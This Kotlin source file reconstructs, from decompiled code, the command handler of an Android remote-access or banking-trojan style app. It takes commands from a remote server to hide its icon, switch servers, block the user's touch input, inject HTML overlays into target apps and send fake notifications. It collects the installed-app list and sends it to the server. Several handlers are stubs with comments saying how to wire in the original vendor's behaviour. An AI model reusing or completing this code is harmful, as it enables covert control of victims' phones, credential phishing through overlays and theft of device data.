package com.storm.safe.rock.service.modules.command

import android.util.Log
import org.json.JSONObject

/**
 * Handles app management commands.
 *
 * Reverse-engineered from JADX: C0344a1 (a1, 816 lines).
 * Vendor name: AppCommandHandler
 *
 * Supported commands:
 * - GET_APP_LIST, LAUNCH_APP, HIDE_APP, SHOW_APP
 * - CHANGE_SERVER_URL, BLACKLIST_DEVICE
 * - DEVICE_BLOCK_INPUT, DEVICE_ALLOW_INPUT
 * - ENABLE_LOGGING/LOG_ENABLE, DISABLE_LOGGING/LOG_DISABLE
 * - SET_BRIGHTNESS/set_brightness, MUTE/mute
 * - VOLUME_UP, VOLUME_DOWN
 * - GET_PERMISSIONS, REQUEST_PERMISSION
 * - SHOW_INJECTION, STOP_INJECTION, SEND_NOTIFICATION
 */
class AppCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "AppCmdHandler"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "GET_APP_LIST",
        "LAUNCH_APP",
        "HIDE_APP",
        "SHOW_APP",
        "CHANGE_SERVER_URL",
        "BLACKLIST_DEVICE",
        "DEVICE_BLOCK_INPUT",
        "DEVICE_ALLOW_INPUT",
        "ENABLE_LOGGING",
        "LOG_ENABLE",
        "DISABLE_LOGGING",
        "LOG_DISABLE",
        "SET_BRIGHTNESS",
        "set_brightness",
        "MUTE",
        "mute",
        "VOLUME_UP",
        "VOLUME_DOWN",
        "GET_PERMISSIONS",
        "REQUEST_PERMISSION",
        "SHOW_INJECTION",
        "STOP_INJECTION",
        "SEND_NOTIFICATION"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "GET_APP_LIST" -> handleGetAppList(params, context)
            "LAUNCH_APP" -> handleLaunchApp(params, context)
            "HIDE_APP" -> handleHideApp(context)
            "SHOW_APP" -> handleShowApp(context)
            "CHANGE_SERVER_URL" -> handleChangeServerUrl(params, context)
            "BLACKLIST_DEVICE" -> handleBlacklistDevice(context)
            "DEVICE_BLOCK_INPUT" -> handleBlockInput(context)
            "DEVICE_ALLOW_INPUT" -> handleAllowInput(context)
            "ENABLE_LOGGING", "LOG_ENABLE" -> handleEnableLogging(context)
            "DISABLE_LOGGING", "LOG_DISABLE" -> handleDisableLogging(context)
            "SET_BRIGHTNESS", "set_brightness" -> handleSetBrightness(params, context)
            "MUTE", "mute" -> handleMute(params, context)
            "VOLUME_UP" -> handleVolumeUp(context)
            "VOLUME_DOWN" -> handleVolumeDown(context)
            "GET_PERMISSIONS" -> handleGetPermissions(context)
            "REQUEST_PERMISSION" -> handleRequestPermission(params, context)
            "SHOW_INJECTION" -> handleShowInjection(params, context)
            "STOP_INJECTION" -> handleStopInjection(params, context)
            "SEND_NOTIFICATION" -> handleSendNotification(params, context)
        }
    }

    /**
     * Get installed application list.
     * Vendor: delegates to coroutine on IO dispatcher, queries PackageManager,
     * builds JSON array with app info, optionally includes base64-encoded icon.
     * JADX: C0344a1 case "GET_APP_LIST" → AppCommandHandler$handleGetAppList$2
     */
    private fun handleGetAppList(params: JSONObject?, context: CommandContext) {
        val includeSystem = params?.optBoolean("includeSystem", false) ?: false
        val includeIcon = params?.optBoolean("includeIcon", true) ?: true
        val requestId = params?.optString("requestId", "") ?: ""
        Log.d(TAG, "获取应用列表: includeSystem=$includeSystem, includeIcon=$includeIcon")

        try {
            val pm = context.service?.packageManager
            val apps = org.json.JSONArray()

            if (pm != null) {
                val installedApps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                for (appInfo in installedApps) {
                    // ADAPT: Vendor filters system apps based on includeSystem flag
                    val isSystem = (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                    if (!includeSystem && isSystem) continue

                    val appJson = JSONObject().apply {
                        put("packageName", appInfo.packageName)
                        put("appName", pm.getApplicationLabel(appInfo).toString())
                        put("isSystem", isSystem)

                        // ADAPT: Vendor includes version info
                        try {
                            val pkgInfo = pm.getPackageInfo(appInfo.packageName, 0)
                            put("versionName", pkgInfo.versionName ?: "")
                            put("versionCode", pkgInfo.versionCode.toLong())
                            put("firstInstallTime", pkgInfo.firstInstallTime)
                            put("lastUpdateTime", pkgInfo.lastUpdateTime)
                        } catch (_: Exception) {
                            put("versionName", "")
                            put("versionCode", 0L)
                        }

                        // ADAPT: Vendor includes icon as base64 (expensive, controlled by flag)
                        if (includeIcon) {
                            // Icon encoding deferred — would require Bitmap/Canvas on real device
                            put("icon", "")
                        }
                    }
                    apps.put(appJson)
                }
            }

            val data = JSONObject().apply {
                put("success", true)
                put("requestId", requestId)
                put("count", apps.length())
                put("apps", apps)
            }
            // ADAPT: Vendor event sent via NetworkManager
            context.sendEvent("app_list_response", data)
        } catch (e: Exception) {
            Log.e(TAG, "获取应用列表失败", e)
            val data = JSONObject().apply {
                put("success", false)
                put("requestId", requestId)
                put("error", e.message ?: "获取应用列表失败")
                put("apps", org.json.JSONArray())
            }
            context.sendEvent("app_list_response", data)
        }
    }

    private suspend fun handleLaunchApp(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        if (packageName.isEmpty()) return
        Log.d(TAG, "启动应用: $packageName")
        try {
            // ADAPT: Vendor gets launch intent from PackageManager and starts activity
            val pm = context.service?.packageManager
            val launchIntent = pm?.getLaunchIntentForPackage(packageName)
            if (launchIntent != null) {
                launchIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                context.service?.startActivity(launchIntent)
                Log.d(TAG, "应用已启动: $packageName")
            } else {
                Log.w(TAG, "未找到应用启动入口: $packageName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "启动应用失败: $packageName", e)
        }
    }

    private fun handleHideApp(context: CommandContext) {
        Log.d(TAG, "隐藏桌面图标")
        // ADAPT: Vendor calls dqtvuisjd.hideAppIcon()
    }

    private fun handleShowApp(context: CommandContext) {
        Log.d(TAG, "显示桌面图标")
        // ADAPT: Vendor calls dqtvuisjd.showAppIcon() via AppIconHideManager
    }

    private fun handleChangeServerUrl(params: JSONObject?, context: CommandContext) {
        // ADAPT: Vendor extracts serverUrl from params (encrypted key)
        var serverUrl = params?.optString("serverUrl", "") ?: ""
        if (serverUrl.isEmpty()) {
            val data = params?.optJSONObject("data")
            serverUrl = data?.optString("serverUrl", "") ?: ""
        }
        if (serverUrl.isNotEmpty()) {
            Log.d(TAG, "收到修改服务器地址命令: $serverUrl")
            // ADAPT: Vendor calls service.changeServerUrl(serverUrl) which updates
            // SharedPreferences and reconnects NetworkManager with new URL.
            // Wire: context.service?.changeServerUrl(serverUrl)
            // Wire: context.networkManager?.updateServerUrl(serverUrl)
        } else {
            Log.w(TAG, "CHANGE_SERVER_URL 参数无效，serverUrl 为空")
        }
    }

    private fun handleBlacklistDevice(context: CommandContext) {
        Log.d(TAG, "收到黑名单封杀命令，强制修改所有服务器地址为: wss://www.google.com")
        // ADAPT: Vendor overwrites all stored server URLs with blackhole
    }

    private fun handleBlockInput(context: CommandContext) {
        Log.d(TAG, "阻断手机操作")
        // ADAPT: Vendor enables touch interception on MaskOverlay
    }

    private fun handleAllowInput(context: CommandContext) {
        Log.d(TAG, "允许手机操作")
        // ADAPT: Vendor disables touch interception on MaskOverlay
    }

    private fun handleEnableLogging(context: CommandContext) {
        Log.d(TAG, "收到启用日志记录命令")
        // ADAPT: Vendor sets ActivityMonitor flags + saves to SharedPrefs
    }

    private fun handleDisableLogging(context: CommandContext) {
        Log.d(TAG, "收到禁用日志记录命令")
        // ADAPT: Vendor clears ActivityMonitor flags + saves to SharedPrefs
    }

    private fun handleSetBrightness(params: JSONObject?, context: CommandContext) {
        val brightness = params?.optInt("brightness", 50) ?: 50
        Log.d(TAG, "收到设置屏幕亮度命令: $brightness%")
        // ADAPT: Vendor calls ScreenBrightnessManager.setBrightness(brightness)
    }

    private suspend fun handleMute(params: JSONObject?, context: CommandContext) {
        val muted = params?.optBoolean("muted", false) ?: false
        Log.d(TAG, "收到静音命令: ${if (muted) "开启" else "关闭"}手机铃声静音")
        // ADAPT: Vendor sets ringer mode, stream mute, haptic feedback via AudioManager
        // Contains a coroutine delay(300ms) between muting steps
    }

    private fun handleVolumeUp(context: CommandContext) {
        Log.d(TAG, "收到音量+命令")
        try {
            val audioManager = context.service?.getSystemService("audio") as? android.media.AudioManager
            if (audioManager == null) {
                Log.e(TAG, "AudioManager 获取失败")
            } else {
                audioManager.adjustVolume(android.media.AudioManager.ADJUST_RAISE, android.media.AudioManager.FLAG_SHOW_UI)
                Log.d(TAG, "已增加音量")
            }
        } catch (e: Exception) {
            Log.e(TAG, "增加音量异常", e)
        }
    }

    private fun handleVolumeDown(context: CommandContext) {
        Log.d(TAG, "收到音量-命令")
        try {
            val audioManager = context.service?.getSystemService("audio") as? android.media.AudioManager
            if (audioManager == null) {
                Log.e(TAG, "AudioManager 获取失败")
            } else {
                audioManager.adjustVolume(android.media.AudioManager.ADJUST_LOWER, android.media.AudioManager.FLAG_SHOW_UI)
                Log.d(TAG, "已减少音量")
            }
        } catch (e: Exception) {
            Log.e(TAG, "减少音量异常", e)
        }
    }

    private suspend fun handleGetPermissions(context: CommandContext) {
        Log.d(TAG, "获取权限状态")
        // ADAPT: Vendor checks all runtime permissions and sends status
    }

    private suspend fun handleRequestPermission(params: JSONObject?, context: CommandContext) {
        val permission = params?.optString("permission", "") ?: ""
        Log.d(TAG, "请求权限: $permission")
        // ADAPT: Vendor launches permission request flow
    }

    private fun handleShowInjection(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        val htmlContent = params?.optString("htmlContent", "") ?: ""
        if (packageName.isEmpty() || htmlContent.isEmpty()) {
            Log.w(TAG, "注入参数不完整")
            return
        }
        Log.d(TAG, "记录注入任务: $packageName, htmlContent长度=${htmlContent.length}")
        // ADAPT: Vendor calls service.registerInjection + showInjectionOverlay
    }

    private fun handleStopInjection(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        if (packageName.isEmpty()) {
            Log.w(TAG, "停止注入参数不完整")
            return
        }
        Log.d(TAG, "停止注入任务: $packageName")
        // ADAPT: Vendor calls service.removeInjection + InjectionActivity.finishForPackage
    }

    private fun handleSendNotification(params: JSONObject?, context: CommandContext) {
        val packageName = params?.optString("packageName", "") ?: ""
        val appName = params?.optString("appName", "") ?: ""
        val title = params?.optString("title", "") ?: ""
        val content = params?.optString("content", "") ?: ""
        val buttonText = params?.optString("buttonText", "") ?: ""

        if (packageName.isEmpty() || content.isEmpty()) {
            Log.w(TAG, "通知参数不完整")
            return
        }
        Log.d(TAG, "发送通知: $title - $content (目标: $packageName, 按钮: $buttonText)")
        // ADAPT: Vendor calls service.sendFakeNotification
    }
}
